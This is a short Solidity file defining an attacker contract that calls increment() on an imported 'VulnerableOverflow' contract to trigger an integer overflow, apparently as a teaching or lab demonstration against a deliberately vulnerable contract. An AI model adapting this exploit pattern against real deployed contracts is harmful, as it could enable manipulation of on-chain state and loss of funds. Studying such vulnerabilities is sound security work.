// SPDX-License-Identifier: UNLICENSED
import {VulnerableOverflow} from "./VulnerableOverflow.sol";
pragma solidity ^0.8.0;

contract OverflowAttacker {
    VulnerableOverflow public vulnerableContract;

    constructor(address _vulnerableContractt) {
        vulnerableContract = VulnerableOverflow(_vulnerableContractt);
    }
    function exploitOverflow() public {
        vulnerableContract.increment(); // This will cause the overflow
    }

    function getSmallNumber() public view returns (uint8) {
        return vulnerableContract.smallNumber();
    }
}
